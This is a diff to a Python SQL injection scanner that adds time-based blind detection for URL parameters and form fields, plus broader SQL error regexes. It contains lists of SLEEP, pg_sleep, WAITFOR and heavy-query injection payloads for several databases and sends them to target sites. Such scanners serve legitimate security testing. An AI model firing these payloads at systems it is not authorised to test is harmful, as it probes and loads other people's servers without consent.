@@ -5,6 +5,7 @@ Tests for SQL injection vulnerabilities by sending payloads and analyzing respon
 """
 
 import re
+import time
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse, parse_qs
@@ -196,6 +197,7 @@ class SQLInjectionScanner:
     def _scan_get_parameters(self, url):
         """
         Test URL GET parameters for SQL injection vulnerabilities.
+        Uses aggressive error-based and time-based detection techniques.
         
         Args:
             url (str): The URL to test
@@ -214,6 +216,7 @@ class SQLInjectionScanner:
         parsed_url = urlparse(url)
         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
         
+        # First check: standard error-based detection
         for param_name, param_values in parameters.items():
             for payload in self.payloads:
                 test_url = f"{base_url}?{param_name}={payload}"
@@ -244,7 +247,8 @@ class SQLInjectionScanner:
                             'parameter': param_name,
                             'payload': payload,
                             'details': detail,
-                            'severity': 'High'
+                            'severity': 'High',
+                            'evidence': 'Error-based detection'
                         }
                         vulnerabilities.append(vulnerability)
                         
@@ -258,11 +262,170 @@ class SQLInjectionScanner:
                     if self.logger:
                         self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
         
+        # Second check: Enhanced time-based blind detection with our advanced method
+        # Only perform if no error-based vulnerabilities found
+        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
+            for param_name, param_values in parameters.items():
+                if self.verbose and self.logger:
+                    self.logger.info(f"Testing parameter '{param_name}' for time-based blind SQL injection")
+                
+                # Use our advanced time-based detection method
+                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(url, param_name=param_name)
+                
+                if is_vulnerable:
+                    detail = f"Parameter '{param_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
+                    vulnerability = {
+                        'type': 'SQL Injection',
+                        'url': url,
+                        'method': 'GET',
+                        'parameter': param_name,
+                        'payload': payload,
+                        'details': detail,
+                        'timing': f"Response delayed by {time_diff:.2f} seconds",
+                        'severity': 'High',
+                        'recommendation': "Parameterize all database queries and implement proper input validation"
+                    }
+                    vulnerabilities.append(vulnerability)
+                    
+                    if self.logger:
+                        self.logger.warning(f"Time-based SQL injection found: {detail}")
+                    
+                    # No need to test more parameters once we've found a vulnerability
+                    break
+        # This is more aggressive as it uses actual timing differences to detect vulnerabilities
+        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
+            # Time-based payloads (shorter delays for better UX while maintaining detection)
+            time_based_payloads = [
+                # MySQL time-based
+                "' AND IF(1=1, SLEEP(2), 0) --",
+                "' AND (SELECT SLEEP(2)) --",
+                "1' AND (SELECT SLEEP(2)) AND '1'='1",
+                
+                # PostgreSQL time-based
+                "'; SELECT pg_sleep(2) --",
+                "1'; SELECT pg_sleep(2) --",
+                
+                # SQL Server time-based
+                "'; WAITFOR DELAY '0:0:2' --",
+                "1'; WAITFOR DELAY '0:0:2' --",
+                
+                # Oracle time-based (using heavy queries)
+                "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
+                "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --"
+            ]
+            
+            for param_name, param_values in parameters.items():
+                for payload in time_based_payloads:
+                    test_url = f"{base_url}?{param_name}={payload}"
+                    
+                    # Add other parameters back
+                    for p_name, p_values in parameters.items():
+                        if p_name != param_name:
+                            test_url += f"&{p_name}={p_values[0]}"
+                    
+                    try:
+                        if self.verbose and self.logger:
+                            self.logger.info(f"Testing time-based payload on parameter '{param_name}': {payload}")
+                        
+                        # First request: normal
+                        start_time = time.time()
+                        response = requests.get(
+                            test_url,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),  # Ensure timeout is long enough
+                            allow_redirects=False
+                        )
+                        end_time = time.time()
+                        time_diff = end_time - start_time
+                        
+                        # If the response took significantly longer, it's likely vulnerable
+                        # Threshold of 1.5 seconds accounts for network jitter while detecting real delays
+                        if time_diff > 1.5:
+                            # Perform a control test with a non-time-based payload to confirm
+                            control_url = f"{base_url}?{param_name}=1"
+                            # Add other parameters back
+                            for p_name, p_values in parameters.items():
+                                if p_name != param_name:
+                                    control_url += f"&{p_name}={p_values[0]}"
+                                    
+                            start_time = time.time()
+                            control_response = requests.get(
+                                control_url,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                            end_time = time.time()
+                            control_time_diff = end_time - start_time
+                            
+                            # If the time difference is significant compared to control request
+                            # (at least 1.5x longer and at least 1.5 second absolute difference)
+                            if time_diff > (control_time_diff * 1.5) and (time_diff - control_time_diff) > 1.5:
+                                detail = f"Parameter '{param_name}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
+                                vulnerability = {
+                                    'type': 'SQL Injection (Blind)',
+                                    'url': url,
+                                    'method': 'GET',
+                                    'parameter': param_name,
+                                    'payload': payload,
+                                    'details': detail,
+                                    'severity': 'High',
+                                    'evidence': f'Time-based detection (payload: {time_diff:.2f}s, control: {control_time_diff:.2f}s)'
+                                }
+                                vulnerabilities.append(vulnerability)
+                                
+                                if self.logger:
+                                    self.logger.warning(f"Blind SQL Injection found: {detail}")
+                                
+                                # No need to test more payloads for this parameter
+                                break
+                    
+                    except requests.exceptions.Timeout:
+                        # Timeout might indicate a successful time-based injection
+                        # But we need to confirm it's not just a slow server
+                        try:
+                            # Control request
+                            control_url = f"{base_url}?{param_name}=1"
+                            control_response = requests.get(
+                                control_url,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                            
+                            # If control request succeeds but payload request times out,
+                            # this strongly suggests a successful time-based injection
+                            detail = f"Parameter '{param_name}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
+                            vulnerability = {
+                                'type': 'SQL Injection (Blind)',
+                                'url': url,
+                                'method': 'GET',
+                                'parameter': param_name,
+                                'payload': payload,
+                                'details': detail,
+                                'severity': 'High',
+                                'evidence': 'Time-based detection (request timeout)'
+                            }
+                            vulnerabilities.append(vulnerability)
+                            
+                            if self.logger:
+                                self.logger.warning(f"Blind SQL Injection found: {detail}")
+                            
+                            # No need to test more payloads for this parameter
+                            break
+                        except:
+                            # If control request also fails, the server might just be slow
+                            pass
+                    except Exception as e:
+                        if self.logger:
+                            self.logger.error(f"Error testing time-based payload on parameter '{param_name}': {str(e)}")
+        
         return vulnerabilities
     
     def _scan_form(self, form_details, url):
         """
         Test a form for SQL injection vulnerabilities.
+        Uses aggressive techniques including error-based and time-based detection.
         
         Args:
             form_details (dict): Form details including inputs
@@ -278,6 +441,7 @@ class SQLInjectionScanner:
         if self.verbose and self.logger:
             self.logger.info(f"Testing form on URL: {url}, Action: {form_details['action']}")
         
+        # Phase 1: Error-based detection
         for payload in self.payloads:
             # We'll test each input field one by one
             for input_field in form_details['inputs']:
@@ -325,7 +489,8 @@ class SQLInjectionScanner:
                             'parameter': input_field['name'],
                             'payload': payload,
                             'details': detail,
-                            'severity': 'High'
+                            'severity': 'High',
+                            'evidence': 'Error-based detection'
                         }
                         vulnerabilities.append(vulnerability)
                         
@@ -339,11 +504,437 @@ class SQLInjectionScanner:
                     if self.logger:
                         self.logger.error(f"Error testing form field '{input_field['name']}': {str(e)}")
         
+        # Phase 2: Enhanced time-based blind injection detection with our advanced method
+        # Only test fields that haven't been detected as vulnerable yet
+        vulnerable_fields = {v['parameter'] for v in vulnerabilities}
+        
+        for input_field in form_details['inputs']:
+            if input_field['name'] in vulnerable_fields or input_field['type'] not in ['text', 'search', 'email', 'url', 'password', 'hidden', '']:
+                continue
+                
+            if self.verbose and self.logger:
+                self.logger.info(f"Testing form field '{input_field['name']}' for time-based blind SQL injection")
+            
+            # Use our advanced time-based detection method
+            is_vulnerable, payload, time_diff = self._detect_time_based_sqli(
+                form_details['action'], 
+                form_details=form_details, 
+                input_field=input_field
+            )
+            
+            if is_vulnerable:
+                detail = f"Form field '{input_field['name']}' is vulnerable to time-based blind SQL injection using payload: {payload}"
+                vulnerability = {
+                    'type': 'SQL Injection (Blind)',
+                    'url': url,
+                    'method': form_details['method'].upper(),
+                    'form_action': form_details['action'],
+                    'parameter': input_field['name'],
+                    'payload': payload,
+                    'details': detail,
+                    'timing': f"Response delayed by {time_diff:.2f} seconds",
+                    'severity': 'High',
+                    'recommendation': "Parameterize all database queries and implement proper input validation"
+                }
+                vulnerabilities.append(vulnerability)
+                
+                if self.logger:
+                    self.logger.warning(f"Time-based SQL injection found: {detail}")
+                
+                # No need to test more fields once we've found a vulnerability
+                break
+                
+            # Fall back to original time-based method if needed
+            time_based_payloads = [
+                # MySQL time-based
+                "' AND IF(1=1, SLEEP(2), 0) --",
+                "' AND (SELECT SLEEP(2)) --",
+                "1' AND (SELECT SLEEP(2)) AND '1'='1",
+                
+                # PostgreSQL time-based
+                "'; SELECT pg_sleep(2) --",
+                "1'; SELECT pg_sleep(2) --",
+                
+                # SQL Server time-based
+                "'; WAITFOR DELAY '0:0:2' --",
+                "1'; WAITFOR DELAY '0:0:2' --",
+                
+                # Oracle time-based (using heavy queries)
+                "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
+                "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --"
+            ]
+            
+            for payload in time_based_payloads:
+                # Prepare data for the form submission
+                data = {}
+                for input_tag in form_details['inputs']:
+                    if input_tag['name'] == input_field['name']:
+                        data[input_tag['name']] = payload
+                    elif input_tag['type'] != 'submit':
+                        data[input_tag['name']] = input_tag['value']
+                
+                if self.verbose and self.logger:
+                    self.logger.info(f"Testing time-based payload on form field '{input_field['name']}': {payload}")
+                
+                try:
+                    # First request with payload
+                    start_time = time.time()
+                    
+                    if form_details['method'] == 'post':
+                        response = requests.post(
+                            form_details['action'],
+                            data=data,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),  # Ensure timeout is long enough
+                            allow_redirects=False
+                        )
+                    else:  # GET
+                        response = requests.get(
+                            form_details['action'],
+                            params=data,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),
+                            allow_redirects=False
+                        )
+                        
+                    end_time = time.time()
+                    time_diff = end_time - start_time
+                    
+                    # If the response took significantly longer, it's likely vulnerable
+                    # Threshold of 1.5 seconds accounts for network jitter while detecting real delays
+                    if time_diff > 1.5:
+                        # Perform a control test with a non-time-based payload to confirm
+                        control_data = {}
+                        for input_tag in form_details['inputs']:
+                            if input_tag['name'] == input_field['name']:
+                                control_data[input_tag['name']] = "test123"  # A safe value
+                            elif input_tag['type'] != 'submit':
+                                control_data[input_tag['name']] = input_tag['value']
+                                    
+                        start_time = time.time()
+                        if form_details['method'] == 'post':
+                            control_response = requests.post(
+                                form_details['action'],
+                                data=control_data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                        else:  # GET
+                            control_response = requests.get(
+                                form_details['action'],
+                                params=control_data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                        end_time = time.time()
+                        control_time_diff = end_time - start_time
+                        
+                        # If the time difference is significant compared to control request
+                        # (at least 1.5x longer and at least 1.5 second absolute difference)
+                        if time_diff > (control_time_diff * 1.5) and (time_diff - control_time_diff) > 1.5:
+                            detail = f"Form field '{input_field['name']}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
+                            vulnerability = {
+                                'type': 'SQL Injection (Blind)',
+                                'url': url,
+                                'method': form_details['method'].upper(),
+                                'form_action': form_details['action'],
+                                'parameter': input_field['name'],
+                                'payload': payload,
+                                'details': detail,
+                                'severity': 'High',
+                                'evidence': f'Time-based detection (payload: {time_diff:.2f}s, control: {control_time_diff:.2f}s)'
+                            }
+                            vulnerabilities.append(vulnerability)
+                            
+                            if self.logger:
+                                self.logger.warning(f"Blind SQL Injection found: {detail}")
+                            
+                            # No need to test more payloads for this field
+                            break
+                
+                except requests.exceptions.Timeout:
+                    # Timeout might indicate a successful time-based injection
+                    # But we need to confirm it's not just a slow server
+                    try:
+                        # Control request
+                        control_data = {}
+                        for input_tag in form_details['inputs']:
+                            if input_tag['name'] == input_field['name']:
+                                control_data[input_tag['name']] = "test123"  # A safe value
+                            elif input_tag['type'] != 'submit':
+                                control_data[input_tag['name']] = input_tag['value']
+                                
+                        if form_details['method'] == 'post':
+                            control_response = requests.post(
+                                form_details['action'],
+                                data=control_data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                        else:  # GET
+                            control_response = requests.get(
+                                form_details['action'],
+                                params=control_data,
+                                headers=self.headers,
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                        
+                        # If control request succeeds but payload request times out,
+                        # this strongly suggests a successful time-based injection
+                        detail = f"Form field '{input_field['name']}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
+                        vulnerability = {
+                            'type': 'SQL Injection (Blind)',
+                            'url': url,
+                            'method': form_details['method'].upper(),
+                            'form_action': form_details['action'],
+                            'parameter': input_field['name'],
+                            'payload': payload,
+                            'details': detail,
+                            'severity': 'High',
+                            'evidence': 'Time-based detection (request timeout)'
+                        }
+                        vulnerabilities.append(vulnerability)
+                        
+                        if self.logger:
+                            self.logger.warning(f"Blind SQL Injection found: {detail}")
+                        
+                        # No need to test more payloads for this field
+                        break
+                    except:
+                        # If control request also fails, the server might just be slow
+                        pass
+                except Exception as e:
+                    if self.logger:
+                        self.logger.error(f"Error testing time-based payload on form field '{input_field['name']}': {str(e)}")
+        
         return vulnerabilities
     
+    def _detect_time_based_sqli(self, url_or_form, param_name=None, form_details=None, input_field=None):
+        """
+        Advanced detection for time-based blind SQL injection vulnerabilities.
+        This method attempts multiple sophisticated payloads and analyzes response times
+        to identify potential blind SQL injection points.
+        
+        Args:
+            url_or_form (str): The URL to test or form action URL
+            param_name (str, optional): The GET parameter name to test
+            form_details (dict, optional): Form details if testing a form
+            input_field (dict, optional): Input field details if testing a form field
+            
+        Returns:
+            tuple: (is_vulnerable, payload, time_diff) or (False, None, 0) if not vulnerable
+        """
+        # Enhanced time-based payloads with more sophisticated techniques
+        time_based_payloads = [
+            # MySQL time-based with conditional logic for more reliable detection
+            "' AND IF(1=1, SLEEP(2), 0) --",
+            "' AND (SELECT SLEEP(2)) --",
+            "1' AND (SELECT SLEEP(2)) AND '1'='1",
+            "' OR (SELECT 1 FROM (SELECT SLEEP(2))A) --",
+            "') OR (SELECT 1 FROM (SELECT SLEEP(2))A) --",
+            "' AND (SELECT * FROM (SELECT SLEEP(2))A) --",
+            
+            # PostgreSQL time-based with different syntax variations
+            "'; SELECT pg_sleep(2) --",
+            "1'; SELECT pg_sleep(2) --",
+            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END --",
+            "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END --",
+            
+            # SQL Server time-based with more variations and conditional logic
+            "'; WAITFOR DELAY '0:0:2' --",
+            "1'; WAITFOR DELAY '0:0:2' --",
+            "'; IF 1=1 WAITFOR DELAY '0:0:2' --",
+            "'; IF 1=1 BEGIN WAITFOR DELAY '0:0:2' END --",
+            
+            # Oracle time-based using various techniques
+            "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
+            "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
+            "' AND (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('A'),2) ELSE NULL END FROM dual) IS NOT NULL --",
+            
+            # SQLite time-based using heavy queries
+            "' AND randomblob(100000000) --",
+            "' AND (WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<1000000) SELECT 1 FROM t LIMIT 1) --",
+            
+            # Universal heavy query techniques
+            "' AND (SELECT count(*) FROM generate_series(1,10000000)) --",
+            "' UNION SELECT 1,pg_sleep(2),null,null,null --",
+            "1' OR 1=(SELECT 1 FROM PG_SLEEP(2)) --",
+            "' OR EXISTS(SELECT SLEEP(2)) --"
+        ]
+        
+        # Control payloads that shouldn't cause delays
+        control_payloads = ["1", "'", "1'", "' --", "1' --"]
+        
+        # For GET parameters
+        if param_name and not form_details:
+            parsed_url = urlparse(url_or_form)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+            parameters = self._extract_parameters(url_or_form)
+            
+            # First get baseline response times with control payloads
+            baseline_times = []
+            for control in control_payloads:
+                control_url = f"{base_url}?{param_name}={control}"
+                # Add other parameters back
+                for p_name, p_values in parameters.items():
+                    if p_name != param_name:
+                        control_url += f"&{p_name}={p_values[0]}"
+                
+                try:
+                    start_time = time.time()
+                    requests.get(
+                        control_url,
+                        headers=self.headers,
+                        timeout=self.timeout,
+                        allow_redirects=False
+                    )
+                    baseline_times.append(time.time() - start_time)
+                except:
+                    continue
+            
+            # Calculate average baseline response time
+            avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
+            
+            # Now test each time-based payload
+            for payload in time_based_payloads:
+                test_url = f"{base_url}?{param_name}={payload}"
+                # Add other parameters back
+                for p_name, p_values in parameters.items():
+                    if p_name != param_name:
+                        test_url += f"&{p_name}={p_values[0]}"
+                
+                try:
+                    start_time = time.time()
+                    requests.get(
+                        test_url,
+                        headers=self.headers,
+                        timeout=max(self.timeout, 10),  # Ensure timeout is long enough
+                        allow_redirects=False
+                    )
+                    time_diff = time.time() - start_time
+                    
+                    # Advanced heuristic: if response is significantly longer than baseline (3x or at least 1.5 sec)
+                    if time_diff > max(avg_baseline * 3, 1.5):
+                        # Perform a second request to confirm and reduce false positives
+                        start_time = time.time()
+                        requests.get(
+                            test_url,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),
+                            allow_redirects=False
+                        )
+                        second_time_diff = time.time() - start_time
+                        
+                        # If both requests show significant delay, it's likely vulnerable
+                        if second_time_diff > max(avg_baseline * 2, 1.0):
+                            return True, payload, time_diff
+                except:
+                    continue
+        
+        # For form fields
+        elif form_details and input_field:
+            # First get baseline response times with control payloads
+            baseline_times = []
+            for control in control_payloads:
+                data = {}
+                for input_tag in form_details['inputs']:
+                    if input_tag['name'] == input_field['name']:
+                        data[input_tag['name']] = control
+                    elif input_tag['type'] != 'submit':
+                        data[input_tag['name']] = input_tag['value']
+                
+                try:
+                    start_time = time.time()
+                    if form_details['method'] == 'post':
+                        requests.post(
+                            form_details['action'],
+                            data=data,
+                            headers=self.headers,
+                            timeout=self.timeout,
+                            allow_redirects=False
+                        )
+                    else:  # GET
+                        requests.get(
+                            form_details['action'],
+                            params=data,
+                            headers=self.headers,
+                            timeout=self.timeout,
+                            allow_redirects=False
+                        )
+                    baseline_times.append(time.time() - start_time)
+                except:
+                    continue
+            
+            # Calculate average baseline response time
+            avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
+            
+            # Now test each time-based payload
+            for payload in time_based_payloads:
+                data = {}
+                for input_tag in form_details['inputs']:
+                    if input_tag['name'] == input_field['name']:
+                        data[input_tag['name']] = payload
+                    elif input_tag['type'] != 'submit':
+                        data[input_tag['name']] = input_tag['value']
+                
+                try:
+                    start_time = time.time()
+                    if form_details['method'] == 'post':
+                        requests.post(
+                            form_details['action'],
+                            data=data,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),
+                            allow_redirects=False
+                        )
+                    else:  # GET
+                        requests.get(
+                            form_details['action'],
+                            params=data,
+                            headers=self.headers,
+                            timeout=max(self.timeout, 10),
+                            allow_redirects=False
+                        )
+                    time_diff = time.time() - start_time
+                    
+                    # Advanced heuristic: if response is significantly longer than baseline (3x or at least 1.5 sec)
+                    if time_diff > max(avg_baseline * 3, 1.5):
+                        # Perform a second request to confirm and reduce false positives
+                        start_time = time.time()
+                        if form_details['method'] == 'post':
+                            requests.post(
+                                form_details['action'],
+                                data=data,
+                                headers=self.headers,
+                                timeout=max(self.timeout, 10),
+                                allow_redirects=False
+                            )
+                        else:  # GET
+                            requests.get(
+                                form_details['action'],
+                                params=data,
+                                headers=self.headers,
+                                timeout=max(self.timeout, 10),
+                                allow_redirects=False
+                            )
+                        second_time_diff = time.time() - start_time
+                        
+                        # If both requests show significant delay, it's likely vulnerable
+                        if second_time_diff > max(avg_baseline * 2, 1.0):
+                            return True, payload, time_diff
+                except:
+                    continue
+        
+        return False, None, 0
+        
     def _check_sql_errors(self, response_content):
         """
         Check if the response contains SQL error messages.
+        Uses aggressive pattern matching to identify even subtle error indications.
         
         Args:
             response_content (str): The response content to check
@@ -351,9 +942,74 @@ class SQLInjectionScanner:
         Returns:
             bool: True if SQL error patterns are found, False otherwise
         """
+        # Standard error pattern check
         for pattern in self.compiled_patterns:
             if pattern.search(response_content):
                 return True
+        
+        # More aggressive checks for subtle error indicators
+        subtle_indicators = [
+            # Database version or environment disclosures
+            r"mysql_fetch_array\(",
+            r"mysqli_fetch_array\(",
+            r"pg_fetch_row\(",
+            r"sqlite3_",
+            r"SQL Server.*Driver",
+            r"PDOStatement",
+            
+            # Functions that might be exposed in stack traces
+            r"execute_query\(",
+            r"executeQuery\(",
+            r"mysql_query\(",
+            r"mysqli_query\(",
+            r"db_query\(",
+            r"SQLQuery",
+            
+            # Typical error message fragments that are more generic
+            r"database error",
+            r"DB Error",
+            r"SQL Error",
+            r"query.*failed",
+            r"failure.*query",
+            r"unexpected.*in.*SQL",
+            r"unexpected.*in.*database",
+            r"command.*not.*properly ended",
+            r"syntax.*near",
+            
+            # Internal structure disclosures
+            r"on (line|column) [0-9]+",
+            r"in query expression",
+            r"error.*line.*[0-9]+",
+            r"SQL state",
+            
+            # Type mismatch errors
+            r"conversion failed",
+            r"cannot convert",
+            r"incompatible.*types",
+            
+            # Table/column references
+            r"table.*does not exist",
+            r"column.*does not exist",
+            r"unknown column",
+            r"field.*not.*found"
+        ]
+        
+        # Extended check for more subtle error patterns
+        for indicator in subtle_indicators:
+            if re.search(indicator, response_content, re.IGNORECASE):
+                return True
+                
+        # Look for exposed SQL keywords in error context
+        sql_keywords_in_errors = [
+            r"(error|exception|warning).*\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b",
+            r"(error|exception|warning).*\b(UNION|JOIN|TABLE|DATABASE)\b",
+            r"\b(SELECT|INSERT|UPDATE|DELETE).*\b(error|exception|warning)\b"
+        ]
+        
+        for keyword_pattern in sql_keywords_in_errors:
+            if re.search(keyword_pattern, response_content, re.IGNORECASE):
+                return True
+        
         return False
     
     def scan(self):
